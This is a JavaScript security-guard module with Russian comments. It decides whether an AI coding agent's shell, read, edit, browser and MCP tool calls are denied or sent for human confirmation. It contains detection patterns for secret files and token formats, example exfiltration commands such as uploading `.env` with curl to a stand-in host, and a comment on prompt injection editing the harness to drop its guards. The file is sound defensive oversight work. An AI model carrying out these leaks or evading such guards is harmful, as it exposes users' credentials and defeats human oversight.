// Гард безопасности — общее ядро. Отвечает на один вопрос: этот вызов может
// утечь секретом, выгрузить данные, тронуть прод или отправить что-то наружу?
//
// Два уровня ответа, и разница принципиальна:
//   deny — законной причины нет, и есть безопасная альтернатива (секреты);
//   ask  — операция законная, но нужен человек (дамп БД, push в main, curl
//          с телом). В auto mode это единственное, что вернёт подтверждение.
//
// Разбор нарочно грубый — распознаются формы, а не синтаксис shell. Всё
// нераспознанное проходит: задача не поймать любой обход, а закрыть удобный
// путь и поставить человека там, где цена ошибки высока.

import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { segments, tokenize, commandIndex, commandName, afterTarget, gitSubcommandAt } from './shell-core.mjs';

export const DENY = 'deny';
export const ASK = 'ask';

// ---------------------------------------------------------------------------
// Секреты. Файл считается хранилищем секретов по имени: содержимое читать,
// чтобы решить, читать ли содержимое, — бессмысленно.

// Список продублирован в ragsave/config.py:SECRET_NAME_RE — правятся вместе.
const SECRET_FILE_RE = [
  // `.env-prod` тоже: разделитель бывает и дефисом.
  /(^|[\\/])\.env([.-][\w-]+)*$/i,
  /(^|[\\/])\.envrc$/i,
  /(^|[\\/])\.?(npmrc|pypirc|netrc|pgpass)$/i,
  // `id_ed25519_github`, `id_rsa-work`; `.pub` сюда не попадает — точка в суффиксе не допустима.
  /(^|[\\/])id_(rsa|dsa|ecdsa|ed25519)([_-][\w-]+)?$/,
  // С точкой — `~/.claude/.credentials.json`, OAuth-токен самого Claude Code.
  /(^|[\\/])\.?(credentials|auth|secrets?|service-account[\w-]*)\.json$/i,
  /(^|[\\/])\.?(credentials|secrets?)\.ya?ml$/i,
  /(^|[\\/])\.git-credentials$/,
  // Terraform: state хранит выходные значения и пароли ресурсов открытым текстом.
  /\.(tfstate(\.backup)?|tfvars(\.json)?)$/i,
  /\.(pem|p12|pfx|keystore|jks)$/i,
  // `.key` без приставки не берём: `obj.key` в коде и `jq .data.key` — не файлы.
  /(^|[\\/])[\w.-]*(private|secret)[\w.-]*\.key$/i,
  // `master.key` — ключ к Rails credentials.yml.enc.
  /(^|[\\/])(server|tls|ssl|client|master)\.key$/i,
  // Окружение процесса целиком. В config.py нет: в проекте его не бывает.
  /(^|[\\/])proc[\\/](self|\d+)[\\/]environ$/,
  // Учётные данные CLI: имена файлов общие (`config`, `config.json`), секретом
  // их делает каталог.
  /(^|[\\/])\.aws[\\/]credentials$/,
  /(^|[\\/])\.docker[\\/]config\.json$/,
  /(^|[\\/])\.kube[\\/]config$/,
  /(^|[\\/])gh[\\/]hosts\.ya?ml$/,
  /(^|[\\/])glab-cli[\\/]config\.ya?ml$/,
];

// Примеры и шаблоны — не секреты, в них имена переменных без значений.
const SECRET_EXEMPT_RE = /[.-](example|sample|template|dist|tpl)$|(^|[\\/])\.env\.example$/i;

export function isSecretPath(p) {
  const s = String(p || '');
  if (!s || SECRET_EXEMPT_RE.test(s)) return false;
  return SECRET_FILE_RE.some((re) => re.test(s));
}

// Значение, похожее на живой секрет, внутри произвольного текста. Нужно там,
// где текст уходит наружу — во внешний CLI, в тело запроса, в публикацию:
// ничего из этого списка туда попасть не должно. Проверяем формы известных
// токенов, а не энтропию — энтропийный порог ловит хеши коммитов и base64
// картинок.
//
// Сейчас в проде вызывающих нет (подсистема делегирования удалена 9 сентября
// 2026), примитив оставлен под будущий исходящий канал и покрыт тестами.
const SECRET_VALUE_RE = [
  /\b(sk|pk)-[A-Za-z0-9_-]{20,}/,                       // OpenAI/Anthropic-подобные
  /\bgh[pousr]_[A-Za-z0-9]{30,}/,                        // GitHub
  /\bglpat-[A-Za-z0-9_-]{20,}/,                          // GitLab
  /\b\d{8,10}:AA[A-Za-z0-9_-]{30,}/,                     // Telegram bot token
  /\bAKIA[0-9A-Z]{16}\b/,                                // AWS access key id
  /-----BEGIN [A-Z ]*PRIVATE KEY-----/,
  /\b(postgres|postgresql|mysql|mongodb(\+srv)?|redis|amqp):\/\/[^\s:@/]+:[^\s@/]+@/i, // DSN с паролем
  /\b(api[_-]?key|secret[_-]?key|access[_-]?token|password|passwd)\s*[:=]\s*["']?[A-Za-z0-9_\-./+]{12,}/i,
];

export function findSecretValue(text) {
  const s = String(text || '');
  for (const re of SECRET_VALUE_RE) {
    const m = s.match(re);
    if (m) return m[0].slice(0, 12) + '…';
  }
  return null;
}

// ---------------------------------------------------------------------------
// База данных: выгрузка целиком и обращение к неместному хосту.

const DUMP_CMDS = new Set(['pg_dump', 'pg_dumpall', 'mysqldump', 'mongodump', 'pgbackrest']);
const DB_CLIENTS = new Set(['psql', 'mysql', 'mongosh', 'mongo', 'redis-cli', 'clickhouse-client']);
const LOCAL_HOST_RE = /^(localhost|127\.0\.0\.1|::1|0\.0\.0\.0|host\.docker\.internal|db|postgres|mysql|redis)$/i;

function hostsIn(seg, toks) {
  const hosts = [];
  for (let i = 0; i < toks.length; i++) {
    const t = toks[i];
    if (t === '-h' || t === '--host') { if (toks[i + 1]) hosts.push(toks[i + 1]); }
    else if (/^--host=/.test(t)) hosts.push(t.split('=')[1]);
  }
  for (const m of String(seg).matchAll(/\b\w+:\/\/(?:[^\s/@]*@)?([\w.-]+)/g)) hosts.push(m[1]);
  return hosts.filter(Boolean);
}

// Переменные окружения, из которых клиент берёт хост.
const DB_HOST_ENV_RE = /(?:^|[\s;&|(])(?:PGHOST|MYSQL_HOST)=["']?([\w.-]+)/g;

// Хост клиента БД: кроме общих форм — слитный `-hHOST` (mysql, psql), строка
// подключения psql `host=…` и переменная окружения. Переменную ищем по всей
// команде: `export PGHOST=prod; psql app` задаёт её в соседнем сегменте.
function dbHostsIn(raw, seg, toks) {
  const hosts = hostsIn(seg, toks);
  for (const t of toks) {
    const joined = t.match(/^-h([^-].*)$/);
    if (joined) hosts.push(joined[1]);
    for (const m of t.matchAll(/(?:^|\s)host(?:addr)?=([\w.-]+)/g)) hosts.push(m[1]);
  }
  for (const m of String(raw).matchAll(DB_HOST_ENV_RE)) hosts.push(m[1]);
  return hosts;
}

// ---------------------------------------------------------------------------
// Ветки и деплой.

const PROTECTED_BRANCH_RE = /^(main|master|dev|develop|prod|production|release(\/.*)?)$/i;
const PROD_TOKEN_RE = /(^|[^a-z])prod(uction)?([^a-z]|$)/i;

// Опции push с отдельным аргументом: без них `-o ci.skip origin` считал
// remote-ом `ci.skip`, а `origin` — веткой.
const PUSH_ARG_OPTS = ['-o', '--push-option', '--repo', '--receive-pack', '--exec'];

// at — индекс подкоманды `push` в токенах.
function gitPushReason(toks, at) {
  const args = toks.slice(at + 1);
  // `-f` бывает и в склейке с другими короткими флагами: `-uf`.
  if (args.some((t) => /^(-[a-z]*f[a-z]*|--force|--force-with-lease.*)$/.test(t))) {
    return 'force push переписывает историю';
  }
  if (args.some((t) => ['--all', '--mirror', '--branches'].includes(t))) {
    return 'push всех веток, включая защищённые';
  }
  if (args.some((t) => t === '-d' || t === '--delete')) return 'удаление ветки на remote';
  // Цель вычисляется при запуске — `$(git branch --show-current)`, `$BRANCH`:
  // в команде её имени нет, решает человек.
  if (args.some((t) => /[$`]/.test(t))) return 'push: цель вычисляется при запуске, в команде её не видно';

  const free = [];
  for (let i = 0; i < args.length; i++) {
    if (PUSH_ARG_OPTS.includes(args[i])) i++;
    else if (!args[i].startsWith('-')) free.push(args[i]);
  }
  // git push [remote] [refspec…] — проверяется каждый refspec, не только последний.
  const refspecs = free.slice(1);
  if (refspecs.length === 0) {
    // Без refspec push уходит в текущую ветку — её имени в команде нет, решает человек.
    return args.some((t) => t === '--dry-run' || t === '-n') ? null : 'push в текущую ветку (refspec не указан)';
  }
  for (const spec of refspecs) {
    // `+` перед refspec — тот же force push, только для одной ветки.
    if (spec.startsWith('+')) return 'force push (+refspec) переписывает историю';
    if (spec.startsWith(':')) return `удаление ветки «${spec.slice(1)}» на remote`;
    const branch = spec.split(':').pop().replace(/^refs\/heads\//, '');
    if (branch === 'HEAD' || branch === '@') return 'push в текущую ветку (HEAD)';
    if (branch.includes('*')) return `push по шаблону «${spec}» задевает все ветки`;
    if (PROTECTED_BRANCH_RE.test(branch)) return `push в защищённую ветку «${branch}»`;
  }
  return null;
}

// Коммит — точка, где человек проверяет, что именно уходит в историю.
function gitCommitReason(toks) {
  if (toks.includes('--amend')) return 'amend переписывает последний коммит';
  if (toks.includes('--no-verify') || toks.includes('-n')) return 'коммит с --no-verify обходит git-хуки';
  return 'создание коммита';
}

// ---------------------------------------------------------------------------
// Отправка данных наружу: curl/wget с телом запроса или загрузкой файла.

// curl — `-d`, `-F`, `-T`, `--data*`, `--json`; wget — `--post-*`, `--body-*`.
// Короткие бывают слитными (`-dfoo`, `-d@file`), длинные — через `=`.
const UPLOAD_FLAG_RE = /^(-[dFT]|--(data[\w-]*|form[\w-]*|upload-file|json|post-(data|file)|body-(data|file)))(=|$)|^-[dFT]./;
const FROM_FILE_FLAG_RE = /^(-T|--upload-file|--(post|body)-file)/;

const hasUploadFlag = (toks) => toks.some((t) => UPLOAD_FLAG_RE.test(t));

// Опции curl/wget с отдельным аргументом: их аргумент — не адрес.
const OUTBOUND_ARG_OPTS = new Set(['-d', '--data', '--data-raw', '--data-binary', '--data-urlencode',
  '--data-ascii', '-F', '--form', '--form-string', '-T', '--upload-file', '--json', '-H', '--header',
  '-X', '--request', '-o', '--output', '-u', '--user', '-A', '--user-agent', '-e', '--referer',
  '-b', '--cookie', '-c', '--cookie-jar', '-K', '--config', '-x', '--proxy', '-w', '--write-out',
  '-m', '--max-time', '--connect-timeout', '--retry', '-r', '--range', '-E', '--cert', '--key',
  '--cacert', '--resolve', '--post-data', '--post-file', '--body-data', '--body-file', '--method',
  '-U', '-P', '--directory-prefix']);

// Адрес без схемы (`curl -d x evil.com`) — свободный аргумент команды. Хост —
// его начало до порта или пути.
function bareHosts(toks) {
  const hosts = [];
  for (let i = commandIndex(toks) + 1; i < toks.length; i++) {
    const t = toks[i];
    if (OUTBOUND_ARG_OPTS.has(t)) { i++; continue; }
    // Перенаправления (`2>&1`, `>out.json`) — не адреса.
    if (/^(-|@|\d*[<>])/.test(t) || t.includes('://')) continue;
    hosts.push(t.replace(/^[^@/]*@/, '').split(/[/:?]/)[0]);
  }
  return hosts;
}

function outboundReason(toks, seg) {
  if (!hasUploadFlag(toks)) return null;
  const hosts = [...hostsIn(seg, toks), ...bareHosts(toks)];
  const external = hosts.filter((h) => h && !LOCAL_HOST_RE.test(h));
  if (external.length === 0) return null;
  const fromFile = /[@<]\s*[\w./-]+/.test(seg) || toks.some((t) => FROM_FILE_FLAG_RE.test(t));
  return `отправка данных на ${external[0]}${fromFile ? ' с содержимым файла' : ''}`;
}

// ---------------------------------------------------------------------------
// Читает ли команда секрет. Именно чтение опасно: прочитанное остаётся в
// транскрипте и уезжает в каждый следующий запрос. Запись в секретный файл
// ничего не раскрывает.

// Команды, которые показывают содержимое файла или исполняют его.
const READS_FILE = new Set([
  'cat', 'head', 'tail', 'less', 'more', 'bat', 'nl', 'tac', 'rev', 'od', 'xxd', 'strings',
  'grep', 'egrep', 'fgrep', 'rg', 'ag', 'ack', 'sed', 'awk', 'gawk', 'cut', 'sort', 'uniq',
  'source', '.', 'diff', 'vimdiff', 'base64', 'openssl',
  'dd', 'paste', 'hexdump', 'hd', 'fold', 'fmt', 'expand', 'iconv', 'column', 'pr', 'comm', 'join',
  'node', 'python', 'python3', 'ruby', 'php', 'perl', 'deno', 'bun', 'jq', 'yq',
]);

// Копирование и передача: опасен источник, а не назначение.
const TRANSFER = new Set(['cp', 'mv', 'scp', 'rsync', 'tar', 'zip', 'install', 'ln']);

function secretReason(file) {
  return {
    level: DENY,
    reason: `\`${file}\` — хранилище секретов, чтение запрещено. ` +
      'Имя переменной — из `.env.example`; значение — запроси у пользователя.',
  };
}

// Кандидаты в пути — куски строки между символами, которых в пути не бывает:
// так путь находится и внутри кода (`readFileSync('.env')`), и после `if=`,
// `HEAD:`, `$HOME`. Разрез, а не поиск regex-ом: поиск с жадным префиксом
// квадратичен, и команда в 100 КБ разбиралась 12 секунд.
// `*`/`?` режутся вторым шагом: шаблон, который целиком кончается суффиксом
// примера (`--include=.env*.example`), совпадает только с примерами и
// выбрасывается до разреза, иначе давал бы кандидат `.env`. `.env*` остаётся.
const NOT_GLOB_PATH_RE = /[^\w@.\-/\\~+*?]+/;

function secretPathsIn(seg, toks) {
  const words = String(seg).split(NOT_GLOB_PATH_RE)
    .flatMap((w) => (/[*?]/.test(w) && SECRET_EXEMPT_RE.test(w) ? [] : w.split(/[*?]+/)));
  const found = new Set([...words, ...toks]);
  // `@файл` — синтаксис curl для «взять тело из файла», сама «собака» частью
  // пути не является и мешала бы сопоставлению имени.
  // `\.` — экранированная точка regex (`process\.env`, `import\.meta\.env`):
  // и в regex, и в неквотированном shell это обычная точка, а не разделитель
  // пути перед `.env`.
  return [...found]
    .map((c) => String(c).replace(/^(-\w)?@/, '').replace(/\\\./g, '.'))
    .filter(isSecretPath);
}

// Рекурсивный grep без `--include` читает каждый файл дерева, и `.env` рядом с
// кодом — тоже: `grep -rn token .` печатает строку с ключом. Имени секрета в
// команде нет, поэтому по пути его не поймать — нужен glob.
const GREP_CMDS = new Set(['grep', 'egrep', 'fgrep']);
// Короткие опции grep с аргументом: после них остаток склейки — аргумент,
// а не флаги (`-error` — шаблон `rror`, не `-r`).
const GREP_ARG_SHORT = 'efmABCdD';

// Операнд — файл, а не каталог: у имени есть расширение (`app.ts`, `*.mjs`,
// `vitest.config.*`). Рекурсия по одним явным файлам дерево не обходит, и
// `.env` так не прочесть — а сам `.env` операндом ловит secretPathsIn.
const FILE_OPERAND_RE = /(^|\/)[^/.][^/]*\.[^/]+$/;
const REDIRECT_RE = /^\d*[<>]/;

function grepWithoutInclude(toks) {
  const args = toks.slice(commandIndex(toks) + 1);
  let recursive = false;
  // Шаблон задан через -e/-f — тогда первый операнд уже путь, а не шаблон.
  let patternOpt = false;
  const operands = [];
  for (let i = 0; i < args.length; i++) {
    const t = args[i];
    if (t === '--') {
      operands.push(...args.slice(i + 1));
      break;
    }
    if (t === '--include' || t.startsWith('--include=')) return false;
    if (t === '--recursive' || t === '--dereference-recursive') recursive = true;
    else if (/^--(regexp|file)=/.test(t)) patternOpt = true;
    else if (t === '--regexp' || t === '--file') {
      patternOpt = true;
      i++;
    } else if (/^-[^-]/.test(t)) {
      for (const [k, ch] of [...t.slice(1)].entries()) {
        if (ch === 'r' || ch === 'R') recursive = true;
        if (!GREP_ARG_SHORT.includes(ch)) continue;
        if (ch === 'e' || ch === 'f') patternOpt = true;
        // Опция последняя в склейке — её аргумент следующим токеном.
        if (k === t.length - 2) i++;
        break;
      }
    } else if (REDIRECT_RE.test(t)) {
      // `2>/dev/null` — перенаправление, не путь; голый `>` забирает следующий токен.
      if (/^\d*[<>]+$/.test(t)) i++;
    } else if (!t.startsWith('--')) operands.push(t);
  }
  if (!recursive) return false;
  const paths = patternOpt ? operands : operands.slice(1);
  return !(paths.length && paths.every((p) => FILE_OPERAND_RE.test(p)));
}

function readsSecret(seg, toks, cmd) {
  // Цель перенаправления вывода — запись, она безвредна: `echo X > .env`,
  // `cat <<EOF > .env`. Отсеиваем её до всего остального, иначе читающая
  // команда слева (`cat`) делала бы запрещённой обычную запись.
  const redirectTargets = [...String(seg).matchAll(/>>?\s*([\w@.\-/\\~]+)/g)].map((m) => m[1]);
  const secrets = secretPathsIn(seg, toks).filter((s) => !redirectTargets.includes(s));
  if (secrets.length === 0) return null;

  // Перенаправление ввода отдаёт файл любой команде, и тогда её имя ничего не
  // решает: `while read …; done < .env`, `cat<.env`. `<<` и `<<<` — heredoc и
  // here-string, `<(…)` — подстановка процесса: пути там нет.
  const inputs = [...String(seg).matchAll(/(?:^|[^<])<(?![<(])\s*([\w@.\-/\\~$]+)/g)]
    .map((m) => m[1].replace(/\\\./g, '.'))
    .filter(isSecretPath);
  if (inputs.length) return inputs[0];

  if (READS_FILE.has(cmd)) return secrets[0];

  if (TRANSFER.has(cmd)) {
    // Последний свободный аргумент — назначение; всё до него читается.
    const free = toks.slice(1).filter((t) => !t.startsWith('-'));
    const dest = free[free.length - 1] || '';
    return secrets.find((s) => s !== dest) || null;
  }

  // Отправка секрета наружу телом запроса: `curl -d @secrets.json`, `-T .env`.
  // Здесь запрет, а не вопрос: подтверждать утечку ключей нечем.
  if (/^(curl|wget|http|httpie)$/.test(cmd) && hasUploadFlag(toks)) {
    return secrets[0];
  }

  // Остальное — команда упоминает секрет, но роли его мы не поняли. Молчим:
  // ложный запрет на `git add .env` или `ls -la .env` толкает искать обход,
  // а содержимого эти команды не показывают.
  return null;
}

// Обёртки, за которыми прячется другая команда. Без их разбора гард ловит
// `cat .env`, но пропускает `bash -c "cat .env"` и `ssh vps "cat .env"` —
// а это не изощрённый обход, а то, как команда пишется естественно.
const SHELL_WRAPPERS = new Set(['bash', 'sh', 'zsh', 'dash', 'ksh', 'fish']);
const CONTAINER_CMDS = new Set(['docker', 'docker-compose', 'podman', 'kubectl']);

// Подкоманды git, которые печатают содержимое файла. Секрет, однажды попавший
// в историю, читается ими и без рабочей копии.
const GIT_READ_SUBCMDS = new Set(['show', 'cat-file', 'diff', 'log', 'blame']);

// Опции с аргументом до цели: без них `ssh -p 2222 vps cat .env` считал хостом
// `2222`, а командой — `vps cat .env`.
const SSH_ARG_OPTS = ['-b', '-B', '-c', '-D', '-E', '-e', '-F', '-I', '-i', '-J', '-L', '-l', '-m',
  '-O', '-o', '-p', '-Q', '-R', '-S', '-W', '-w'];
const EXEC_ARG_OPTS = ['-u', '--user', '-e', '--env', '--env-file', '-w', '--workdir',
  '--detach-keys', '--index', '-n', '--namespace', '-c', '--container', '--context', '-f', '--filename'];
const RUN_ARG_OPTS = [...EXEC_ARG_OPTS, '-v', '--volume', '-p', '--publish', '--name', '--network',
  '--net', '--entrypoint', '-m', '--memory', '--cpus', '-l', '--label', '--mount', '--platform',
  '--restart', '-h', '--hostname', '--add-host', '--device', '--cap-add', '--cap-drop', '--ulimit',
  '--log-driver', '--log-opt', '--pull', '--tmpfs', '--expose', '--link', '--volumes-from', '--ipc',
  '--pid', '--shm-size', '--stop-signal'];

// Команды, спрятанные внутри аргументов: `-c "…"`, `eval`, удалённая команда
// ssh, тело `find -exec`, команда внутри контейнера.
function nestedCommands(toks, cmd) {
  const out = [];
  const at = commandIndex(toks);

  if (SHELL_WRAPPERS.has(cmd)) {
    for (let i = at + 1; i < toks.length; i++) {
      if (/^-[a-z]*c$/i.test(toks[i]) && toks[i + 1]) out.push(toks[i + 1]);
    }
  }

  if (cmd === 'eval') out.push(toks.slice(at + 1).join(' '));

  if (cmd === 'ssh') out.push(afterTarget(toks, at + 1, SSH_ARG_OPTS).join(' '));

  if (CONTAINER_CMDS.has(cmd)) {
    const exec = toks.indexOf('exec');
    const run = toks.indexOf('run');
    if (exec !== -1 || run !== -1) {
      const start = exec !== -1 ? exec : run;
      let rest = afterTarget(toks, start + 1, exec !== -1 ? EXEC_ARG_OPTS : RUN_ARG_OPTS);
      // kubectl exec pod -c ctr -- команда: опции бывают и после цели.
      if (rest.includes('--')) rest = rest.slice(rest.indexOf('--') + 1);
      out.push(rest.join(' '));
    }
  }

  if (cmd === 'find') {
    const i = toks.findIndex((t) => t === '-exec' || t === '-execdir' || t === '-ok');
    if (i !== -1) {
      out.push(toks.slice(i + 1).filter((t) => !['{}', ';', '\\;', '+'].includes(t)).join(' '));
    }
  }

  return out.filter((c) => c && c.trim());
}

// Первое слово вложенной команды — чтобы понять, читает ли она файл, когда
// путь остался снаружи (`find . -name .env -exec cat {} \;`).
function nestedReadsFile(nested) {
  return nested.some((c) => READS_FILE.has(commandName(tokenize(c))));
}

// Команда печатает окружение целиком: голый `env` (и за обёрткой — `sudo env`),
// `printenv` без имени, `set`, `export -p`, `declare -x`. Имя команды или null.
function printsEnv(toks) {
  const at = commandIndex(toks);
  const cmd = path.basename(toks[at] || '');
  const rest = toks.slice(at + 1);
  // `env` — обёртка: без команды после него он печатает окружение.
  if (!cmd) return toks.some((t) => path.basename(t) === 'env') ? 'env' : null;
  if (cmd === 'printenv' && rest.every((t) => t.startsWith('-'))) return cmd;
  if (cmd === 'set' && rest.length === 0) return cmd;
  if (['export', 'declare', 'typeset'].includes(cmd) && rest.every((t) => /^-[px]+$/.test(t))) return cmd;
  return null;
}

export function guardBashSecurity(command, depth = 0) {
  const raw = String(command || '');
  if (!raw.trim() || depth > 3) return null;

  for (const { text: seg, piped } of segments(raw)) {
    const toks = tokenize(seg);
    const cmd = commandName(toks);

    // До отсева пустого cmd: голый `env` — обёртка без команды, имя у него пустое.
    const envCmd = printsEnv(toks);
    if (envCmd) {
      return {
        level: ASK,
        reason: `\`${envCmd}\` печатает всё окружение. Нужна одна переменная — назови её явно.`,
      };
    }

    if (!cmd) continue;

    // Вложенные команды разбираем до всего остального: обёртка сама по себе
    // безобидна, опасно то, что она запускает.
    const nested = nestedCommands(toks, cmd);
    for (const inner of nested) {
      const verdict = guardBashSecurity(inner, depth + 1);
      if (verdict) return verdict;
    }

    // Путь снаружи, чтение внутри: `find . -name .env -exec cat {} \;`.
    if (nested.length && nestedReadsFile(nested)) {
      const outer = secretPathsIn(seg, toks)[0];
      if (outer) return secretReason(outer);
    }

    // git читает содержимое из истории, даже когда файла нет в рабочей копии.
    if (cmd === 'git' && toks.some((t) => GIT_READ_SUBCMDS.has(t))) {
      const hit = secretPathsIn(seg, toks)[0];
      if (hit) return secretReason(hit);
    }

    // Секреты проверяем первыми: `curl -T .env` — это не «отправка данных,
    // подтверди», а утечка ключей, и подтверждать её нечем.
    // Запрещаем только чтение: содержимое попадает в транскрипт навсегда.
    // Запись безвредна — `cp .env.example .env` и `echo X >> .env` ничего не
    // раскрывают, и блокировать их значит мешать обычной настройке проекта.
    // Читающая команда из пайпа берёт путь из соседнего сегмента
    // (`echo .env | xargs cat`), поэтому кандидатов ищем по всей строке.
    const scope = piped && READS_FILE.has(cmd) ? raw : seg;
    const secret = readsSecret(scope, toks, cmd);
    if (secret) return secretReason(secret);

    if (GREP_CMDS.has(cmd) && grepWithoutInclude(toks)) {
      return {
        level: DENY,
        reason: 'рекурсивный grep без `--include` читает и `.env` в дереве. ' +
          'Символ в индексированном проекте ищет `tokensave_search`; доки, конфиги, yml, ' +
          'инфраструктуру — `rag_search`; вне индексов укажи файлы: `--include=*.ts` (можно несколько).',
      };
    }

    // Команды, печатающие окружение целиком. Секрет в них приходит не из
    // файла, а из вывода, и по имени файла его не поймать: `printenv` в
    // проекте с экспортированным токеном кладёт его в транскрипт так же
    // надёжно, как `cat .env`.
    if (/^docker(-compose)?$/.test(cmd) && toks.includes('config') && !toks.includes('--services')) {
      return {
        level: ASK,
        reason: '`docker compose config` печатает конфиг с подставленными секретами. Список сервисов — `--services`.',
      };
    }

    if (DUMP_CMDS.has(cmd)) {
      return { level: ASK, reason: `\`${cmd}\` выгружает базу целиком.` };
    }

    if (DB_CLIENTS.has(cmd)) {
      const external = dbHostsIn(raw, seg, toks).filter((h) => !LOCAL_HOST_RE.test(h));
      if (external.length) {
        return { level: ASK, reason: `\`${cmd}\` идёт на внешний хост ${external[0]} — возможно, боевая база.` };
      }
      if (/\.dump\b|--rdb\b|COPY\s+.*\bTO\b/i.test(seg)) {
        return { level: ASK, reason: `\`${cmd}\` выгружает содержимое базы.` };
      }
    }

    if (cmd === 'sqlite3' && /\.dump\b/.test(seg)) {
      return { level: ASK, reason: 'sqlite3 .dump выгружает базу целиком.' };
    }

    if (cmd === 'git') {
      const at = gitSubcommandAt(toks);
      if (toks[at] === 'commit') return { level: ASK, reason: gitCommitReason(toks) };
      if (toks[at] === 'push') {
        const reason = gitPushReason(toks, at);
        if (reason) return { level: ASK, reason };
      }
    }

    if (cmd === 'docker' || cmd === 'docker-compose') {
      const acts = ['up', 'down', 'restart', 'stack', 'push'];
      if (toks.some((t) => acts.includes(t)) && PROD_TOKEN_RE.test(seg)) {
        return { level: ASK, reason: 'docker меняет прод-конфигурацию.' };
      }
    }

    if (cmd === 'kubectl' && toks.some((t) => ['apply', 'delete', 'scale', 'rollout', 'patch'].includes(t))) {
      return { level: ASK, reason: 'kubectl меняет состояние кластера.' };
    }

    if (cmd === 'ssh' && /\b(systemctl|docker|rm|deploy|migrate)\b/.test(seg)) {
      return { level: ASK, reason: 'команда меняет состояние удалённого хоста.' };
    }

    if (cmd === 'curl' || cmd === 'wget' || cmd === 'http' || cmd === 'httpie') {
      const reason = outboundReason(toks, seg);
      if (reason) return { level: ASK, reason };
    }

  }
  return null;
}

export function guardReadSecurity(filePath) {
  if (!filePath) return null;
  // Симлинк с безобидным именем (`config.txt` → `.env`) читается как цель.
  const real = isSecretPath(filePath) ? null : resolveReal(String(filePath));
  if (real && !isSecretPath(real)) return null;
  const shown = real ? `${filePath}\` → \`${real}` : filePath;
  return {
    level: DENY,
    reason: `\`${shown}\` — хранилище секретов, чтение запрещено. ` +
      'Структура — `.env.example`; значение — запроси у пользователя.',
  };
}

// MCP-инструменты, которые отдают содержимое файла. Они идут мимо Read, и без
// этого списка гард закрывал бы парадную дверь при открытом чёрном ходе.
// Имя файла у них лежит в разных полях, поэтому проверяем все правдоподобные.
const MCP_FILE_READERS = /^mcp__\w+__\w*(read|body|signature|context|cat|open|file)\w*$/i;

function mcpFileTarget(ti) {
  return ti.file || ti.file_path || ti.path || ti.symbol || '';
}

// Браузер тоже читает с диска: `file://…/.env` в адресе и файл, выбранный для
// загрузки на страницу. Имена — Playwright MCP в Claude и в OpenCode.
const BROWSER_NAVIGATE_RE = /^mcp__\w+__\w*browser_navigate$/;
const BROWSER_UPLOAD_RE = /^mcp__\w+__\w*browser_file_upload$/;

// Путь из `file://` без %-кодов; любой другой адрес — пустая строка.
function fileUrlPath(url) {
  const s = String(url || '');
  if (!/^file:/i.test(s)) return '';
  try {
    return fileURLToPath(s);
  } catch {
    return s.replace(/^file:\/*/i, '/');
  }
}

// ---------------------------------------------------------------------------
// Правка самого харнеса. Гарды, хуки, правила и settings.json живут в этом
// репозитории, и правка применяется сразу, в том числе к текущей сессии. Из
// сессии в ~/harness это обычная работа; из чужого проекта — след prompt
// injection из его файлов или ошибка, и одна молчаливая правка security-core
// снимает все гарды разом. `Edit(~/harness/**)` в permissions.allow пускает её
// без вопроса, поэтому вопрос задаёт гард.

const HARNESS_ROOT = realpathOrSelf(path.join(path.dirname(fileURLToPath(import.meta.url)), '..'));

function realpathOrSelf(p) {
  try { return fs.realpathSync(p); } catch { return p; }
}

// Реальный путь, даже если файла ещё нет: разворачиваем ближайшего
// существующего предка, остаток пристёгиваем. Иначе `~/.ai-hooks/…` (симлинк)
// или новый файл внутри харнеса выглядели бы чужими.
function resolveReal(p) {
  let dir = path.resolve(p);
  const rest = [];
  while (!fs.existsSync(dir) && path.dirname(dir) !== dir) {
    rest.unshift(path.basename(dir));
    dir = path.dirname(dir);
  }
  return path.join(realpathOrSelf(dir), ...rest);
}

function insideHarness(p) {
  const rel = path.relative(HARNESS_ROOT, p);
  return rel === '' || (!rel.startsWith('..') && !path.isAbsolute(rel));
}

function guardHarnessEdit(filePath, cwd) {
  if (!filePath || !cwd) return null;
  const base = resolveReal(cwd);
  if (insideHarness(base)) return null;
  const target = resolveReal(path.resolve(base, String(filePath)));
  if (!insideHarness(target)) return null;
  return {
    level: ASK,
    reason: `правка харнеса (${path.relative(HARNESS_ROOT, target)}) из сессии в ${cwd}: ` +
      'гарды, хуки и правила меняются сразу и для всех сессий. Подтверди, что это просил человек.',
  };
}

// Единая точка для адаптера хука. ctx.cwd — каталог сессии: от него зависит,
// своя ли правка харнеса.
export function securityGuard(toolName, toolInput = {}, ctx = {}) {
  const name = String(toolName || '');
  const ti = toolInput || {};

  if (name === 'Read') return guardReadSecurity(ti.file_path || ti.path || '');
  if (name === 'Edit' || name === 'Write' || name === 'MultiEdit' || name === 'NotebookEdit') {
    const file = ti.file_path || ti.notebook_path || ti.path || '';
    return guardReadSecurity(file) || guardHarnessEdit(file, ctx.cwd);
  }
  if (name === 'Bash') return guardBashSecurity(ti.command);
  if (name === 'mcp__ide__executeCode') return guardBashSecurity(ti.code);
  if (name === 'Grep') {
    // glob проверяется и как имя, и как шаблон: `.env*` захватывает `.env`,
    // `.env.*` — `.env.local`.
    const glob = String(ti.glob || '');
    const target = [ti.path, glob, glob.replace(/\*+/g, ''), glob.replace(/\*+/g, 'x')]
      .find((p) => p && isSecretPath(p));
    return target ? guardReadSecurity(target) : null;
  }
  if (BROWSER_NAVIGATE_RE.test(name)) return guardReadSecurity(fileUrlPath(ti.url));
  if (BROWSER_UPLOAD_RE.test(name)) {
    const paths = Array.isArray(ti.paths) ? ti.paths : [];
    return paths.map((p) => guardReadSecurity(p)).find(Boolean) || null;
  }
  if (MCP_FILE_READERS.test(name)) return guardReadSecurity(mcpFileTarget(ti));
  return null;
}
